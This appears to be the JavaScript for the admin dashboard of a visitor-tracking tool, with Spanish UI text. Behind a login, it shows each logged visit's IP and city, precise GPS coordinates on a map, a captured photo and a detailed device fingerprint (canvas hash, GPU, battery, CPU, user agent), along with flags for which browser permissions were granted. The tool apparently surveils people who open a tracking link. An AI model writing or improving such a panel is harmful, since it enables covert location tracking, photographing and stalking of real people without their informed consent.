const loginWrap = document.getElementById('loginWrap');
const loginForm = document.getElementById('loginForm');
const dash = document.getElementById('dash');
const errEl = document.getElementById('err');

let token = sessionStorage.getItem('panel_token') || '';
let map, markersLayer;

function esc(s) {
  if (s === null || s === undefined || s === '') return '<span style="color:#5c5450">—</span>';
  return String(s).replace(/[&<>"]/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;' }[c]));
}
function fmtDate(d) {
  try { return new Date(d).toLocaleString('es-CO', { dateStyle: 'short', timeStyle: 'medium' }); }
  catch { return d; }
}

loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  errEl.textContent = '';
  const user = document.getElementById('user').value.trim();
  const pass = document.getElementById('pass').value;
  try {
    const r = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user, pass })
    });
    const j = await r.json();
    if (!r.ok) { errEl.textContent = j.error || 'Error al entrar'; return; }
    token = j.token;
    sessionStorage.setItem('panel_token', token);
    showDash();
  } catch { errEl.textContent = 'No se pudo conectar'; }
});

function showDash() {
  loginWrap.style.display = 'none';
  dash.classList.add('active');
  if (!map) {
    map = L.map('map').setView([6.08, -75.34], 10); // Oriente antioqueño por defecto
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19, attribution: '© OpenStreetMap'
    }).addTo(map);
    markersLayer = L.layerGroup().addTo(map);
  }
  loadVisits();
}

async function loadVisits() {
  const r = await fetch('/api/visits', { headers: { Authorization: 'Bearer ' + token } });
  if (r.status === 401) { logout(); return; }
  const { visits } = await r.json();
  render(visits || []);
}

function render(visits) {
  document.getElementById('stTotal').textContent = visits.length;
  document.getElementById('stGps').textContent = visits.filter(v => v.gps_lat).length;
  document.getElementById('stPhoto').textContent = visits.filter(v => v.photo).length;

  const rows = document.getElementById('rows');
  const empty = document.getElementById('empty');
  empty.style.display = visits.length ? 'none' : 'block';

  markersLayer.clearLayers();
  const pts = [];

  rows.innerHTML = visits.map(v => {
    let perms = {};
    try { perms = typeof v.permissions === 'string' ? JSON.parse(v.permissions) : (v.permissions || {}); } catch {}
    const chip = (k, label) => `<span class="chip ${perms[k] ? 'yes' : 'no'}">${label} ${perms[k] ? '✓' : '✗'}</span>`;

    let gpsCell = '—';
    if (v.gps_lat && v.gps_lon) {
      gpsCell = `<a class="gps-link" target="_blank" href="https://www.openstreetmap.org/?mlat=${v.gps_lat}&mlon=${v.gps_lon}#map=16/${v.gps_lat}/${v.gps_lon}">${Number(v.gps_lat).toFixed(5)}, ${Number(v.gps_lon).toFixed(5)}</a><br><small style="color:var(--ash)">±${esc(v.gps_accuracy)}</small>`;
      const m = L.marker([Number(v.gps_lat), Number(v.gps_lon)]).bindPopup(
        `<b>${esc(v.device_label)}</b><br>${esc(v.ip)}<br>${fmtDate(v.created_at)}`
      );
      markersLayer.addLayer(m);
      pts.push([Number(v.gps_lat), Number(v.gps_lon)]);
    }

    const photoCell = v.photo ? `<img class="shot" src="${v.photo}" alt="foto" />` : '—';

    return `<tr>
      <td>${v.id}</td>
      <td>${fmtDate(v.created_at)}</td>
      <td>${esc(v.ip)}</td>
      <td>${esc([v.ip_city, v.ip_region, v.ip_country].filter(Boolean).join(', '))}</td>
      <td>${gpsCell}</td>
      <td>${esc(v.device_label)}<br><small style="color:var(--ash)">${esc(v.platform)}</small></td>
      <td>${esc(v.screen)}<br><small style="color:var(--ash)">vp ${esc(v.viewport)}</small></td>
      <td>${esc(v.cpu_cores)} núcleos<br><small style="color:var(--ash)">${esc(v.device_memory)}</small></td>
      <td class="ua">${esc(v.gpu)}</td>
      <td>${esc(v.timezone)}<br><small style="color:var(--ash)">${esc(v.languages)}</small></td>
      <td>${esc(v.battery)}</td>
      <td><small>${esc(v.canvas_fp)}</small></td>
      <td>${chip('gps','GPS')} ${chip('photo','Foto')} ${chip('fingerprint','Huella')}</td>
      <td>${photoCell}</td>
      <td class="ua">${esc(v.user_agent)}</td>
    </tr>`;
  }).join('');

  if (pts.length) {
    map.fitBounds(pts, { padding: [40, 40], maxZoom: 15 });
  }
}

function logout() {
  sessionStorage.removeItem('panel_token');
  token = '';
  dash.classList.remove('active');
  loginWrap.style.display = 'flex';
}

document.getElementById('refreshBtn').addEventListener('click', loadVisits);
document.getElementById('logoutBtn').addEventListener('click', logout);
document.getElementById('clearBtn').addEventListener('click', async () => {
  if (!confirm('¿Borrar TODAS las visitas registradas? Esto no se puede deshacer.')) return;
  const r = await fetch('/api/clear', { method: 'POST', headers: { Authorization: 'Bearer ' + token } });
  if (r.ok) loadVisits();
});

// Si ya había token en la sesión, entrar directo
if (token) showDash();
